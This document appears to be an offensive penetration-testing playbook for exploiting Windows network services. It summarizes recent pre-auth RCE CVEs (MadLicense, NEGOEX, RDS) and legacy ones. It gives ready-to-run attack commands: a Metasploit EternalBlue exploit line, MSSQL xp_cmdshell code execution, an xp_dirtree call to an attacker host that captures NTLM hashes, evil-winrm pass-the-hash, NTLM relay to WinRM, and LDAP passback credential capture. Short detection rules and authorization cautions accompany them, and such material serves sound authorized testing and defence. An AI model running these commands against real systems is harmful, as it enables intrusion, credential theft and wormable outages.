# Network Service Exploitation — Protocol RCE & Abuse

Direct compromise of listening network services: legacy wormable SMB/RDP, recent
pre-auth Windows RCEs (2024-2025), and protocol abuse (MSSQL link crawling, WinRM,
LDAP passback). Scope the surface first, then match service → CVE/abuse.

```bash
# This skill's targeted exposure scanner maps listening ports -> known CVEs/abuse:
python3 scripts/net_service_scan.py 10.0.0.0/24 --json surface.json
```

---

## 1. MadLicense — CVE-2024-38077 (RD Licensing, pre-auth RCE) ★ current

### Theory
**CVSS 9.8, CWE-122 heap overflow** in the Windows Remote Desktop **Licensing** (RDL)
service. License-key packet decoding fails to validate decoded size vs. the allocated
buffer → 0-click, **pre-auth** RCE. Affects **all Windows Server 2000–2025** *when the
RDL role is enabled* (not default, but common on VDI/jump/RDS hosts to exceed the
2-session limit). Researchers achieved ~100% reliability on Server 2025, bypassing
current mitigations.

```bash
# Detect the surface (RDL listens on TCP 1688 + RPC):
python3 scripts/net_service_scan.py <TARGET>     # flags 1688/tcp -> CVE-2024-38077
nmap -p1688 -sV <TARGET>
# PoC: mrmtwoj/CVE-2024-38077 (heap-overflow chain). Validate in lab; patch = Aug 2024.
```
- **Detection:** RDL service crashes/restarts (Event Log Service Control Manager 7031),
  anomalous traffic to 1688/tcp from untrusted hosts, RPC to the licensing interface.
- **OPSEC:** Exploit corrupts heap — a failed attempt may crash the service (DoS,
  loud). Confirm patch level out-of-band first. RDL should never be internet-facing
  (~170k were exposed at disclosure).

---

## 2. NEGOEX wormable RCE — CVE-2025-47981 ★ current (Jul 2025)

### Theory
**CVSS 9.8** heap overflow in the SPNEGO **NEGOEX** extension (negotiation of auth
mechanisms). **Unauthenticated, no user interaction, wormable** — Microsoft assigned
its highest exploitability rating ("exploitation more likely within 30 days"). Affects
Windows 10 1607+ and current Server releases. Any service that negotiates SPNEGO
(SMB, RDP, IIS/HTTP with Negotiate, RPC) is a candidate trigger surface.

```bash
# No public stable port-specific check; verify patch level + restrict SPNEGO surfaces.
python3 scripts/net_service_scan.py <subnet>      # flags 135/SPNEGO-bearing services
# Patch: Jul 8 2025 cumulative update. Treat unpatched + exposed SMB/RDP/IIS as critical.
```
- **Detection:** crashes in lsass/auth stack; abnormal SPNEGO/NEGOEX tokens; patch
  telemetry. **OPSEC:** wormable bugs are high-collateral — never spray; single,
  authorized target only, with the customer's blessing on the DoS risk.

---

## 3. RMCAST wormable RCE — CVE-2025-21307 ★ current

### Theory
RCE in the Windows **Reliable Multicast Transport (RMCAST / PGM)** driver — wormable,
no UI. Not a fixed TCP port (multicast/PGM over IP proto 113). Relevant where PGM/MSMQ
multicast is enabled. Patch + disable unused multicast transport. Detection: anomalous
PGM/multicast to the driver; patch level.

---

## 4. RDS RCE pair — CVE-2025-24035 / CVE-2025-24045 (Mar 2025)

CVSS 8.1 RCE in **Remote Desktop Services**. Unauthorized network attacker → code
execution. Scope 3389/tcp; verify March-2025 patch level.
```bash
python3 scripts/net_service_scan.py <subnet>     # flags 3389 -> CVE-2025-24035/24045
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <TARGET>
```
**Legacy still found:** BlueKeep (CVE-2019-0708, pre-auth RCE Win7/2008R2) —
`nmap -p3389 --script rdp-vuln-ms12-020`.

---

## 5. SMB exploitation (legacy + abuse)

```bash
# EternalBlue MS17-010 — still alive in legacy/OT/unpatched segments
nmap -p445 --script smb-vuln-ms17-010 <TARGET>
msfconsole -qx "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET>; run"

# Null-session enum (legacy 2008/2003) + signing for relay (see coercion-relay-network.md)
smbclient -L //<TARGET> -N
rpcclient -U "" -N <TARGET> -c "enumdomusers;querydominfo"
nxc smb <subnet> --gen-relay-list relay.txt        # signing:False -> relay targets

# CVE-2025-33073 NTLM reflection on signing:False hosts -> SYSTEM
#   (full chain in references/coercion-relay-network.md)
```
PrintNightmare (CVE-2021-34527) and the SMBGhost (CVE-2020-0796) class remain useful
against unpatched legacy; check before assuming patched.

---

## 6. Protocol abuse (no CVE — design weaknesses)

### MSSQL
```bash
impacket-mssqlclient corp.local/user:'Pass'@<SQL_IP> -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami                                   # RCE
# NTLM capture from SQL service account:
SQL> EXEC master..xp_dirtree '\\<ATTACKER_IP>\share'      # -> Responder/relay
# Linked-server crawl (lateral movement across trusted SQL links):
SQL> SELECT * FROM openquery("LINKED", 'SELECT * FROM openquery("NEXT",''xp_cmdshell ''''whoami'''''')')
# Relay TO mssql for RCE: see references/coercion-relay-network.md
```

### WinRM (5985/5986)
```bash
evil-winrm -i <TARGET> -u user -p 'Pass'        # PowerShell remoting shell
evil-winrm -i <TARGET> -u user -H <NTLM>        # pass-the-hash
# WinRM also a relay target: ntlmrelayx -t http://<TARGET>:5985/wsman --no-http-server
# CLM/AppLocker bypass: WinRM into localhost can dodge local language-mode restrictions
```

### LDAP passback
A printer/MFP/appliance configured for LDAP auth: change its LDAP server to your IP,
trigger a test → it sends its bind credentials in clear.
```bash
nc -lvnp 389        # capture the LDAP simple-bind DN + password the device sends
```

---

## Detection (this cluster)
```yaml
title: Suspicious Network Service Exploitation
detection:
  rdl_crash:   { source: 'Service Control Manager', EventID: 7031, ServiceName: 'TermServLicensing' }
  smb_eb:      { signature: 'smb-vuln-ms17-010 / SMBv1 trans2 anomaly' }
  xp_cmdshell: { source: mssql, text: 'sp_configure ''xp_cmdshell''' }
  winrm_new:   { EventID: 4624, LogonType: 3, Port: 5985 }
  condition: 1 of them
```
- IOCs: service crash/restart events, `xp_cmdshell`/`sp_configure` audit, `xp_dirtree`
  to external UNC, evil-winrm default user-agent, scanner-style fan-out to 445/3389/
  1688. Pair with `net_service_scan.py` output to track what was reachable.

## OPSEC (this cluster)
- Memory-corruption exploits (MadLicense/NEGOEX/EternalBlue) risk **service crash =
  DoS** — never spray wormable bugs; single authorized target, lab-validate first,
  get explicit sign-off on availability risk.
- Protocol abuse (xp_cmdshell, WinRM, LDAP passback) is far quieter and reversible —
  prefer it where it achieves the objective. Disable `xp_cmdshell` again on cleanup;
  remove any temp SQL logins/jobs created.

## References
- Cato CTRL / Censys / runZero CVE-2024-38077 "MadLicense" advisories (Aug 2024);
  mrmtwoj/CVE-2024-38077 PoC; MSRC advisory.
- Help Net Security / Medium, CVE-2025-47981 NEGOEX wormable RCE (Jul 2025); MSRC.
- WindowsForum CVE-2025-21307 RMCAST advisory (Jan 2025); MSRC.
- MSRC CVE-2025-24035 / CVE-2025-24045 (RDS RCE, Mar 2025).
- MITRE ATT&CK T1210 (Exploitation of Remote Services), T1021.006 (WinRM),
  T1505.001 (SQL Stored Procedures), T1557 (relay).
